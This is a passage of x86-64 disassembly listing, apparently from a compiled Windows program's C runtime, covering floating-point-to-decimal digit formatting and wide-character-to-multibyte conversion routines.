  40841f:	66 0f 28 c8          	movapd %xmm0,%xmm1
  408423:	83 c2 01             	add    $0x1,%edx
  408426:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
  40842d:	f2 0f 59 cb          	mulsd  %xmm3,%xmm1
  408431:	66 0f 28 c1          	movapd %xmm1,%xmm0
  408435:	f2 0f 5e c2          	divsd  %xmm2,%xmm0
  408439:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
  40843d:	f2 0f 2a c0          	cvtsi2sd %eax,%xmm0
  408441:	8d 50 30             	lea    0x30(%rax),%edx
  408444:	88 16                	mov    %dl,(%rsi)
  408446:	48 83 c6 01          	add    $0x1,%rsi
  40844a:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
  40844e:	f2 0f 5c c8          	subsd  %xmm0,%xmm1
  408452:	66 0f 2e ce          	ucomisd %xmm6,%xmm1
  408456:	66 0f 28 c1          	movapd %xmm1,%xmm0
  40845a:	7a b4                	jp     0x408410
  40845c:	66 0f 2e cc          	ucomisd %xmm4,%xmm1
  408460:	75 ae                	jne    0x408410
  408462:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  408467:	41 83 c4 01          	add    $0x1,%r12d
  40846b:	45 31 ed             	xor    %r13d,%r13d
  40846e:	e9 cf f0 ff ff       	jmp    0x407542
  408473:	83 7c 24 60 01       	cmpl   $0x1,0x60(%rsp)
  408478:	0f 85 e3 f9 ff ff    	jne    0x407e61
  40847e:	8b 47 04             	mov    0x4(%rdi),%eax
  408481:	83 c0 01             	add    $0x1,%eax
  408484:	41 39 c4             	cmp    %eax,%r12d
  408487:	0f 8e d4 f9 ff ff    	jle    0x407e61
  40848d:	83 84 24 80 00 00 00 	addl   $0x1,0x80(%rsp)
  408494:	01 
  408495:	83 44 24 70 01       	addl   $0x1,0x70(%rsp)
  40849a:	c7 84 24 8c 00 00 00 	movl   $0x1,0x8c(%rsp)
  4084a1:	01 00 00 00 
  4084a5:	e9 b7 f9 ff ff       	jmp    0x407e61
  4084aa:	83 bc 24 88 00 00 00 	cmpl   $0xe,0x88(%rsp)
  4084b1:	0e 
  4084b2:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
  4084b9:	01 00 00 00 
  4084bd:	b9 01 00 00 00       	mov    $0x1,%ecx
  4084c2:	0f 96 c2             	setbe  %dl
  4084c5:	21 c2                	and    %eax,%edx
  4084c7:	e9 06 f4 ff ff       	jmp    0x4078d2
  4084cc:	41 bf 01 00 00 00    	mov    $0x1,%r15d
  4084d2:	c7 84 24 38 01 00 00 	movl   $0x1,0x138(%rsp)
  4084d9:	01 00 00 00 
  4084dd:	e9 76 fd ff ff       	jmp    0x408258
  4084e2:	44 8b 54 24 6c       	mov    0x6c(%rsp),%r10d
  4084e7:	45 85 d2             	test   %r10d,%r10d
  4084ea:	0f 84 e9 02 00 00    	je     0x4087d9
  4084f0:	83 7c 24 6c 01       	cmpl   $0x1,0x6c(%rsp)
  4084f5:	0f 84 3b 04 00 00    	je     0x408936
  4084fb:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  408500:	41 83 c4 01          	add    $0x1,%r12d
  408504:	e9 c5 f5 ff ff       	jmp    0x407ace
  408509:	41 bc 02 00 00 00    	mov    $0x2,%r12d
  40850f:	31 ed                	xor    %ebp,%ebp
  408511:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
  408518:	00 00 
  40851a:	e9 8c f7 ff ff       	jmp    0x407cab
  40851f:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
  408524:	8d 48 ff             	lea    -0x1(%rax),%ecx
  408527:	48 8d 15 f2 15 0d 00 	lea    0xd15f2(%rip),%rdx        # 0x4d9b20
  40852e:	f2 0f 10 5c 24 28    	movsd  0x28(%rsp),%xmm3
  408534:	4c 89 5c 24 28       	mov    %r11,0x28(%rsp)
  408539:	48 63 c9             	movslq %ecx,%rcx
  40853c:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
  408543:	01 00 00 00 
  408547:	4c 89 fe             	mov    %r15,%rsi
  40854a:	f2 0f 59 1c ca       	mulsd  (%rdx,%rcx,8),%xmm3
  40854f:	f2 0f 10 44 24 28    	movsd  0x28(%rsp),%xmm0
  408555:	f2 0f 10 15 43 15 0d 	movsd  0xd1543(%rip),%xmm2        # 0x4d9aa0
  40855c:	00 
  40855d:	eb 13                	jmp    0x408572
  40855f:	90                   	nop
  408560:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
  408564:	83 c1 01             	add    $0x1,%ecx
  408567:	89 8c 24 ac 00 00 00 	mov    %ecx,0xac(%rsp)
  40856e:	66 0f 28 c8          	movapd %xmm0,%xmm1
  408572:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
  408576:	85 d2                	test   %edx,%edx
  408578:	74 0c                	je     0x408586
  40857a:	f2 0f 2a c2          	cvtsi2sd %edx,%xmm0
  40857e:	f2 0f 5c c8          	subsd  %xmm0,%xmm1
  408582:	66 0f 28 c1          	movapd %xmm1,%xmm0
  408586:	83 c2 30             	add    $0x30,%edx
  408589:	88 16                	mov    %dl,(%rsi)
  40858b:	8b 8c 24 ac 00 00 00 	mov    0xac(%rsp),%ecx
  408592:	48 83 c6 01          	add    $0x1,%rsi
  408596:	39 c1                	cmp    %eax,%ecx
  408598:	75 c6                	jne    0x408560
  40859a:	f2 0f 10 0d 2e 15 0d 	movsd  0xd152e(%rip),%xmm1        # 0x4d9ad0
  4085a1:	00 
  4085a2:	66 0f 28 d3          	movapd %xmm3,%xmm2
  4085a6:	f2 0f 58 d1          	addsd  %xmm1,%xmm2
  4085aa:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
  4085ae:	0f 87 63 ef ff ff    	ja     0x407517
  4085b4:	f2 0f 5c cb          	subsd  %xmm3,%xmm1
  4085b8:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
  4085bc:	0f 86 58 f6 ff ff    	jbe    0x407c1a
  4085c2:	66 0f 2e c6          	ucomisd %xmm6,%xmm0
  4085c6:	0f 8a 34 02 00 00    	jp     0x408800
  4085cc:	0f 85 2e 02 00 00    	jne    0x408800
  4085d2:	45 31 ed             	xor    %r13d,%r13d
  4085d5:	eb 10                	jmp    0x4085e7
  4085d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4085de:	00 00 
  4085e0:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
  4085e4:	48 89 c6             	mov    %rax,%rsi
  4085e7:	80 fa 30             	cmp    $0x30,%dl
  4085ea:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
  4085ee:	74 f0                	je     0x4085e0
  4085f0:	45 8d 61 01          	lea    0x1(%r9),%r12d
  4085f4:	e9 49 ef ff ff       	jmp    0x407542
  4085f9:	8b 4c 24 6c          	mov    0x6c(%rsp),%ecx
  4085fd:	49 89 d9             	mov    %rbx,%r9
  408600:	89 e8                	mov    %ebp,%eax
  408602:	45 89 f8             	mov    %r15d,%r8d
  408605:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
  40860a:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
  40860f:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
  408616:	00 
  408617:	85 c9                	test   %ecx,%ecx
  408619:	0f 84 b1 02 00 00    	je     0x4088d0
  40861f:	41 83 7e 14 01       	cmpl   $0x1,0x14(%r14)
  408624:	0f 8e 9b 02 00 00    	jle    0x4088c5
  40862a:	83 7c 24 6c 02       	cmpl   $0x2,0x6c(%rsp)
  40862f:	0f 84 f6 02 00 00    	je     0x40892b
  408635:	4d 89 cd             	mov    %r9,%r13
  408638:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
  40863d:	eb 47                	jmp    0x408686
  40863f:	90                   	nop
  408640:	44 88 26             	mov    %r12b,(%rsi)
  408643:	45 31 c0             	xor    %r8d,%r8d
  408646:	4c 89 e9             	mov    %r13,%rcx
  408649:	ba 0a 00 00 00       	mov    $0xa,%edx
  40864e:	48 83 c6 01          	add    $0x1,%rsi
  408652:	e8 d9 0e 00 00       	call   0x409530
  408657:	4c 39 ef             	cmp    %r13,%rdi
  40865a:	4c 89 f1             	mov    %r14,%rcx
  40865d:	ba 0a 00 00 00       	mov    $0xa,%edx
  408662:	48 0f 44 f8          	cmove  %rax,%rdi
  408666:	45 31 c0             	xor    %r8d,%r8d
  408669:	48 89 c3             	mov    %rax,%rbx
  40866c:	e8 bf 0e 00 00       	call   0x409530
  408671:	48 89 ea             	mov    %rbp,%rdx
  408674:	48 89 c1             	mov    %rax,%rcx
  408677:	49 89 c6             	mov    %rax,%r14
  40867a:	e8 d1 09 00 00       	call   0x409050
  40867f:	44 8d 60 30          	lea    0x30(%rax),%r12d
  408683:	49 89 dd             	mov    %rbx,%r13
  408686:	4c 89 ea             	mov    %r13,%rdx
  408689:	48 89 e9             	mov    %rbp,%rcx
  40868c:	e8 df 12 00 00       	call   0x409970
  408691:	85 c0                	test   %eax,%eax
  408693:	7f ab                	jg     0x408640
  408695:	41 83 fc 39          	cmp    $0x39,%r12d
  408699:	4d 89 e9             	mov    %r13,%r9
  40869c:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
  4086a1:	0f 84 b9 02 00 00    	je     0x408960
  4086a7:	41 83 c4 01          	add    $0x1,%r12d
  4086ab:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  4086b1:	44 88 26             	mov    %r12b,(%rsi)
  4086b4:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  4086b9:	48 83 c6 01          	add    $0x1,%rsi
  4086bd:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
  4086c2:	41 83 c4 01          	add    $0x1,%r12d
  4086c6:	e9 f0 f5 ff ff       	jmp    0x407cbb
  4086cb:	4c 89 f1             	mov    %r14,%rcx
  4086ce:	ba 01 00 00 00       	mov    $0x1,%edx
  4086d3:	e8 98 11 00 00       	call   0x409870
  4086d8:	48 89 ea             	mov    %rbp,%rdx
  4086db:	48 89 c1             	mov    %rax,%rcx
  4086de:	49 89 c6             	mov    %rax,%r14
  4086e1:	e8 8a 12 00 00       	call   0x409970
  4086e6:	83 f8 00             	cmp    $0x0,%eax
  4086e9:	0f 8f 7f fc ff ff    	jg     0x40836e
  4086ef:	75 0a                	jne    0x4086fb
  4086f1:	41 80 e4 01          	and    $0x1,%r12b
  4086f5:	0f 85 73 fc ff ff    	jne    0x40836e
  4086fb:	41 83 7e 14 01       	cmpl   $0x1,0x14(%r14)
  408700:	0f 8e 56 03 00 00    	jle    0x408a5c
  408706:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  40870c:	eb 05                	jmp    0x408713
  40870e:	66 90                	xchg   %ax,%ax
  408710:	48 89 c6             	mov    %rax,%rsi
  408713:	80 7e ff 30          	cmpb   $0x30,-0x1(%rsi)
  408717:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
  40871b:	74 f3                	je     0x408710
  40871d:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  408722:	41 83 c4 01          	add    $0x1,%r12d
  408726:	e9 90 f5 ff ff       	jmp    0x407cbb
  40872b:	8b b4 24 80 00 00 00 	mov    0x80(%rsp),%esi
  408732:	c7 84 24 ac 00 00 00 	movl   $0x0,0xac(%rsp)
  408739:	00 00 00 00 
  40873d:	31 c0                	xor    %eax,%eax
  40873f:	2b b4 24 88 00 00 00 	sub    0x88(%rsp),%esi
  408746:	e9 30 f6 ff ff       	jmp    0x407d7b
  40874b:	41 8b 49 08          	mov    0x8(%r9),%ecx
  40874f:	e8 9c 0c 00 00       	call   0x4093f0
  408754:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
  408759:	48 8d 48 10          	lea    0x10(%rax),%rcx
  40875d:	48 89 c6             	mov    %rax,%rsi
  408760:	48 63 42 14          	movslq 0x14(%rdx),%rax
  408764:	48 83 c2 10          	add    $0x10,%rdx
  408768:	4c 8d 04 85 08 00 00 	lea    0x8(,%rax,4),%r8
  40876f:	00 
  408770:	e8 f3 17 00 00       	call   0x409f68
  408775:	ba 01 00 00 00       	mov    $0x1,%edx
  40877a:	48 89 f1             	mov    %rsi,%rcx
  40877d:	e8 ee 10 00 00       	call   0x409870
  408782:	49 89 c1             	mov    %rax,%r9
  408785:	e9 93 f8 ff ff       	jmp    0x40801d
  40878a:	83 7c 24 6c 02       	cmpl   $0x2,0x6c(%rsp)
  40878f:	0f 84 0f f9 ff ff    	je     0x4080a4
  408795:	41 83 fc 39          	cmp    $0x39,%r12d
  408799:	49 89 d9             	mov    %rbx,%r9
  40879c:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
  4087a1:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
  4087a6:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
  4087ad:	00 
  4087ae:	0f 84 ac 01 00 00    	je     0x408960
  4087b4:	45 8d 6c 24 01       	lea    0x1(%r12),%r13d
  4087b9:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  4087be:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
  4087c3:	44 88 2e             	mov    %r13b,(%rsi)
  4087c6:	48 83 c6 01          	add    $0x1,%rsi
  4087ca:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  4087d0:	41 83 c4 01          	add    $0x1,%r12d
  4087d4:	e9 e2 f4 ff ff       	jmp    0x407cbb
  4087d9:	f2 0f 58 c0          	addsd  %xmm0,%xmm0
  4087dd:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
  4087e1:	0f 87 4f 01 00 00    	ja     0x408936
  4087e7:	66 0f 2e d0          	ucomisd %xmm0,%xmm2
  4087eb:	0f b6 56 ff          	movzbl -0x1(%rsi),%edx
  4087ef:	44 8b 4c 24 68       	mov    0x68(%rsp),%r9d
  4087f4:	7a 0a                	jp     0x408800
  4087f6:	75 08                	jne    0x408800
  4087f8:	a8 01                	test   $0x1,%al
  4087fa:	0f 85 17 ed ff ff    	jne    0x407517
  408800:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  408806:	e9 dc fd ff ff       	jmp    0x4085e7
  40880b:	49 89 d9             	mov    %rbx,%r9
  40880e:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
  408813:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
  408818:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
  40881f:	00 
  408820:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
  408825:	e9 22 fb ff ff       	jmp    0x40834c
  40882a:	44 8b 94 24 88 00 00 	mov    0x88(%rsp),%r10d
  408831:	00 
  408832:	45 85 d2             	test   %r10d,%r10d
  408835:	0f 84 75 f3 ff ff    	je     0x407bb0
  40883b:	44 8b 8c 24 9c 00 00 	mov    0x9c(%rsp),%r9d
  408842:	00 
  408843:	45 85 c9             	test   %r9d,%r9d
  408846:	0f 8e ce f3 ff ff    	jle    0x407c1a
  40884c:	f2 0f 10 0d 4c 12 0d 	movsd  0xd124c(%rip),%xmm1        # 0x4d9aa0
  408853:	00 
  408854:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
  40885a:	f2 0f 59 cc          	mulsd  %xmm4,%xmm1
  40885e:	66 0f 28 c1          	movapd %xmm1,%xmm0
  408862:	f2 0f 11 4c 24 28    	movsd  %xmm1,0x28(%rsp)
  408868:	4c 8b 5c 24 28       	mov    0x28(%rsp),%r11
  40886d:	f2 0f 59 05 33 12 0d 	mulsd  0xd1233(%rip),%xmm0        # 0x4d9aa8
  408874:	00 
  408875:	f2 0f 58 05 33 12 0d 	addsd  0xd1233(%rip),%xmm0        # 0x4d9ab0
  40887c:	00 
  40887d:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  408883:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
  408888:	4c 89 d0             	mov    %r10,%rax
  40888b:	41 83 e2 ff          	and    $0xffffffff,%r10d
  40888f:	48 c1 e8 20          	shr    $0x20,%rax
  408893:	8d 80 00 00 c0 fc    	lea    -0x3400000(%rax),%eax
  408899:	48 c1 e0 20          	shl    $0x20,%rax
  40889d:	49 09 c2             	or     %rax,%r10
  4088a0:	8b 84 24 9c 00 00 00 	mov    0x9c(%rsp),%eax
  4088a7:	e9 1d f1 ff ff       	jmp    0x4079c9
  4088ac:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  4088b1:	83 c2 01             	add    $0x1,%edx
  4088b4:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  4088ba:	88 10                	mov    %dl,(%rax)
  4088bc:	41 83 c4 01          	add    $0x1,%r12d
  4088c0:	e9 f6 f3 ff ff       	jmp    0x407cbb
  4088c5:	41 83 7e 18 00       	cmpl   $0x0,0x18(%r14)
  4088ca:	0f 85 5a fd ff ff    	jne    0x40862a
  4088d0:	85 c0                	test   %eax,%eax
  4088d2:	0f 8e 9e 00 00 00    	jle    0x408976
  4088d8:	4c 89 f1             	mov    %r14,%rcx
  4088db:	ba 01 00 00 00       	mov    $0x1,%edx
  4088e0:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
  4088e5:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
  4088ea:	e8 81 0f 00 00       	call   0x409870
  4088ef:	48 89 ea             	mov    %rbp,%rdx
  4088f2:	48 89 c1             	mov    %rax,%rcx
  4088f5:	49 89 c6             	mov    %rax,%r14
  4088f8:	e8 73 10 00 00       	call   0x409970
  4088fd:	83 f8 00             	cmp    $0x0,%eax
  408900:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
  408905:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
  40890a:	0f 8e fd 00 00 00    	jle    0x408a0d
  408910:	41 83 fc 39          	cmp    $0x39,%r12d
  408914:	74 4a                	je     0x408960
  408916:	45 8d 60 31          	lea    0x31(%r8),%r12d
  40891a:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  408920:	41 83 7e 14 01       	cmpl   $0x1,0x14(%r14)
  408925:	0f 8e cf 00 00 00    	jle    0x4089fa
  40892b:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  408931:	e9 7b fd ff ff       	jmp    0x4086b1
  408936:	0f b6 56 ff          	movzbl -0x1(%rsi),%edx
  40893a:	44 8b 4c 24 68       	mov    0x68(%rsp),%r9d
  40893f:	e9 d3 eb ff ff       	jmp    0x407517
  408944:	41 8b 46 18          	mov    0x18(%r14),%eax
  408948:	85 c0                	test   %eax,%eax
  40894a:	0f 85 1e fa ff ff    	jne    0x40836e
  408950:	45 31 ed             	xor    %r13d,%r13d
  408953:	e9 bb fd ff ff       	jmp    0x408713
  408958:	83 c2 01             	add    $0x1,%edx
  40895b:	e9 d6 eb ff ff       	jmp    0x407536
  408960:	c6 06 39             	movb   $0x39,(%rsi)
  408963:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
  408968:	48 83 c6 01          	add    $0x1,%rsi
  40896c:	ba 39 00 00 00       	mov    $0x39,%edx
  408971:	e9 05 fa ff ff       	jmp    0x40837b
  408976:	45 31 ed             	xor    %r13d,%r13d
  408979:	eb a5                	jmp    0x408920
  40897b:	41 83 fc 39          	cmp    $0x39,%r12d
  40897f:	49 89 d9             	mov    %rbx,%r9
  408982:	45 89 f8             	mov    %r15d,%r8d
  408985:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
  40898a:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
  40898f:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
  408996:	00 
  408997:	74 c7                	je     0x408960
  408999:	45 85 ed             	test   %r13d,%r13d
  40899c:	0f 8e 95 00 00 00    	jle    0x408a37
  4089a2:	45 8d 60 31          	lea    0x31(%r8),%r12d
  4089a6:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  4089ac:	e9 00 fd ff ff       	jmp    0x4086b1
  4089b1:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
  4089b6:	45 31 c0             	xor    %r8d,%r8d
  4089b9:	ba 0a 00 00 00       	mov    $0xa,%edx
  4089be:	e8 6d 0b 00 00       	call   0x409530
  4089c3:	83 bc 24 9c 00 00 00 	cmpl   $0x0,0x9c(%rsp)
  4089ca:	00 
  4089cb:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  4089d0:	7f 0a                	jg     0x4089dc
  4089d2:	83 bc 24 30 01 00 00 	cmpl   $0x2,0x130(%rsp)
  4089d9:	02 
  4089da:	7f 48                	jg     0x408a24
  4089dc:	8b 94 24 9c 00 00 00 	mov    0x9c(%rsp),%edx
  4089e3:	89 94 24 88 00 00 00 	mov    %edx,0x88(%rsp)
  4089ea:	e9 02 f6 ff ff       	jmp    0x407ff1
  4089ef:	0f 85 f2 f9 ff ff    	jne    0x4083e7
  4089f5:	e9 68 fa ff ff       	jmp    0x408462
  4089fa:	41 83 7e 18 00       	cmpl   $0x0,0x18(%r14)
  4089ff:	b8 10 00 00 00       	mov    $0x10,%eax
  408a04:	44 0f 45 e8          	cmovne %eax,%r13d
  408a08:	e9 a4 fc ff ff       	jmp    0x4086b1
  408a0d:	75 0a                	jne    0x408a19
  408a0f:	41 f6 c4 01          	test   $0x1,%r12b
  408a13:	0f 85 f7 fe ff ff    	jne    0x408910
  408a19:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  408a1f:	e9 fc fe ff ff       	jmp    0x408920
  408a24:	8b 8c 24 9c 00 00 00 	mov    0x9c(%rsp),%ecx
  408a2b:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%rsp)
  408a32:	e9 bf f4 ff ff       	jmp    0x407ef6
  408a37:	41 83 7e 14 01       	cmpl   $0x1,0x14(%r14)
  408a3c:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  408a42:	0f 8f 69 fc ff ff    	jg     0x4086b1
  408a48:	41 83 7e 18 01       	cmpl   $0x1,0x18(%r14)
  408a4d:	45 19 ed             	sbb    %r13d,%r13d
  408a50:	41 f7 d5             	not    %r13d
  408a53:	41 83 e5 10          	and    $0x10,%r13d
  408a57:	e9 55 fc ff ff       	jmp    0x4086b1
  408a5c:	45 31 ed             	xor    %r13d,%r13d
  408a5f:	41 83 7e 18 00       	cmpl   $0x0,0x18(%r14)
  408a64:	0f 85 9c fc ff ff    	jne    0x408706
  408a6a:	e9 a4 fc ff ff       	jmp    0x408713
  408a6f:	8b 84 24 9c 00 00 00 	mov    0x9c(%rsp),%eax
  408a76:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
  408a7d:	e9 74 f4 ff ff       	jmp    0x407ef6
  408a82:	90                   	nop
  408a83:	90                   	nop
  408a84:	90                   	nop
  408a85:	90                   	nop
  408a86:	90                   	nop
  408a87:	90                   	nop
  408a88:	90                   	nop
  408a89:	90                   	nop
  408a8a:	90                   	nop
  408a8b:	90                   	nop
  408a8c:	90                   	nop
  408a8d:	90                   	nop
  408a8e:	90                   	nop
  408a8f:	90                   	nop
  408a90:	48 83 ec 58          	sub    $0x58,%rsp
  408a94:	45 85 c0             	test   %r8d,%r8d
  408a97:	44 89 c0             	mov    %r8d,%eax
  408a9a:	66 89 54 24 68       	mov    %dx,0x68(%rsp)
  408a9f:	75 13                	jne    0x408ab4
  408aa1:	66 81 fa ff 00       	cmp    $0xff,%dx
  408aa6:	77 52                	ja     0x408afa
  408aa8:	88 11                	mov    %dl,(%rcx)
  408aaa:	b8 01 00 00 00       	mov    $0x1,%eax
  408aaf:	48 83 c4 58          	add    $0x58,%rsp
  408ab3:	c3                   	ret
  408ab4:	48 8d 54 24 4c       	lea    0x4c(%rsp),%rdx
  408ab9:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
  408abe:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  408ac3:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
  408aca:	00 
  408acb:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  408ad2:	00 00 
  408ad4:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  408ada:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
  408adf:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
  408ae4:	31 d2                	xor    %edx,%edx
  408ae6:	89 c1                	mov    %eax,%ecx
  408ae8:	ff 15 b2 5b 0d 00    	call   *0xd5bb2(%rip)        # 0x4de6a0
  408aee:	85 c0                	test   %eax,%eax
  408af0:	74 08                	je     0x408afa
  408af2:	8b 54 24 4c          	mov    0x4c(%rsp),%edx
  408af6:	85 d2                	test   %edx,%edx
  408af8:	74 b5                	je     0x408aaf
  408afa:	e8 71 15 00 00       	call   0x40a070
  408aff:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
  408b05:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  408b0a:	48 83 c4 58          	add    $0x58,%rsp
  408b0e:	c3                   	ret
  408b0f:	90                   	nop
  408b10:	57                   	push   %rdi
  408b11:	56                   	push   %rsi
  408b12:	53                   	push   %rbx
  408b13:	48 83 ec 30          	sub    $0x30,%rsp
  408b17:	48 8b 05 c2 5b 0d 00 	mov    0xd5bc2(%rip),%rax        # 0x4de6e0
  408b1e:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
  408b23:	48 85 c9             	test   %rcx,%rcx
  408b26:	89 d6                	mov    %edx,%esi
  408b28:	8b 38                	mov    (%rax),%edi
  408b2a:	48 0f 45 d9          	cmovne %rcx,%rbx
  408b2e:	ff 15 1c 04 0d 00    	call   *0xd041c(%rip)        # 0x4d8f50
  408b34:	0f b7 d6             	movzwl %si,%edx
  408b37:	41 89 c0             	mov    %eax,%r8d
  408b3a:	48 89 d9             	mov    %rbx,%rcx
  408b3d:	41 89 f9             	mov    %edi,%r9d
  408b40:	e8 4b ff ff ff       	call   0x408a90
  408b45:	48 98                	cltq
  408b47:	48 83 c4 30          	add    $0x30,%rsp
  408b4b:	5b                   	pop    %rbx
  408b4c:	5e                   	pop    %rsi
  408b4d:	5f                   	pop    %rdi
  408b4e:	c3                   	ret
  408b4f:	90                   	nop
  408b50:	41 56                	push   %r14
  408b52:	41 55                	push   %r13
  408b54:	41 54                	push   %r12
  408b56:	55                   	push   %rbp
  408b57:	57                   	push   %rdi
  408b58:	56                   	push   %rsi
  408b59:	53                   	push   %rbx
  408b5a:	48 83 ec 30          	sub    $0x30,%rsp
  408b5e:	31 f6                	xor    %esi,%esi
  408b60:	49 89 d6             	mov    %rdx,%r14
  408b63:	48 89 cb             	mov    %rcx,%rbx
  408b66:	4c 89 c5             	mov    %r8,%rbp
  408b69:	ff 15 e1 03 0d 00    	call   *0xd03e1(%rip)        # 0x4d8f50
  408b6f:	49 8b 3e             	mov    (%r14),%rdi
  408b72:	41 89 c4             	mov    %eax,%r12d
  408b75:	48 8b 05 64 5b 0d 00 	mov    0xd5b64(%rip),%rax        # 0x4de6e0
  408b7c:	48 85 ff             	test   %rdi,%rdi
  408b7f:	44 8b 28             	mov    (%rax),%r13d
  408b82:	74 42                	je     0x408bc6
  408b84:	48 85 db             	test   %rbx,%rbx
  408b87:	74 69                	je     0x408bf2
  408b89:	48 85 ed             	test   %rbp,%rbp
  408b8c:	75 1c                	jne    0x408baa
  408b8e:	66 90                	xchg   %ax,%ax
  408b90:	eb 4e                	jmp    0x408be0
  408b92:	48 63 c8             	movslq %eax,%rcx
  408b95:	48 01 cb             	add    %rcx,%rbx
  408b98:	48 01 ce             	add    %rcx,%rsi
  408b9b:	80 7b ff 00          	cmpb   $0x0,-0x1(%rbx)
  408b9f:	74 44                	je     0x408be5
  408ba1:	48 83 c7 02          	add    $0x2,%rdi
  408ba5:	48 39 f5             	cmp    %rsi,%rbp
  408ba8:	76 36                	jbe    0x408be0
  408baa:	0f b7 17             	movzwl (%rdi),%edx
  408bad:	45 89 e9             	mov    %r13d,%r9d
  408bb0:	45 89 e0             	mov    %r12d,%r8d
  408bb3:	48 89 d9             	mov    %rbx,%rcx
  408bb6:	e8 d5 fe ff ff       	call   0x408a90
  408bbb:	85 c0                	test   %eax,%eax
  408bbd:	7f d3                	jg     0x408b92
  408bbf:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
  408bc6:	48 89 f0             	mov    %rsi,%rax
  408bc9:	48 83 c4 30          	add    $0x30,%rsp
  408bcd:	5b                   	pop    %rbx
  408bce:	5e                   	pop    %rsi
  408bcf:	5f                   	pop    %rdi
  408bd0:	5d                   	pop    %rbp
  408bd1:	41 5c                	pop    %r12
  408bd3:	41 5d                	pop    %r13
  408bd5:	41 5e                	pop    %r14
  408bd7:	c3                   	ret
  408bd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  408bdf:	00 
  408be0:	49 89 3e             	mov    %rdi,(%r14)
  408be3:	eb e1                	jmp    0x408bc6
  408be5:	49 c7 06 00 00 00 00 	movq   $0x0,(%r14)
  408bec:	48 83 ee 01          	sub    $0x1,%rsi
  408bf0:	eb d4                	jmp    0x408bc6
  408bf2:	48 85 ed             	test   %rbp,%rbp
  408bf5:	75 24                	jne    0x408c1b
  408bf7:	eb cd                	jmp    0x408bc6
  408bf9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  408c00:	48 63 d0             	movslq %eax,%rdx
  408c03:	83 e8 01             	sub    $0x1,%eax
  408c06:	48 98                	cltq
  408c08:	48 01 d6             	add    %rdx,%rsi
  408c0b:	80 7c 04 20 00       	cmpb   $0x0,0x20(%rsp,%rax,1)
  408c10:	74 22                	je     0x408c34
  408c12:	48 83 c7 02          	add    $0x2,%rdi
  408c16:	48 39 f5             	cmp    %rsi,%rbp
  408c19:	76 ab                	jbe    0x408bc6
  408c1b:	0f b7 17             	movzwl (%rdi),%edx
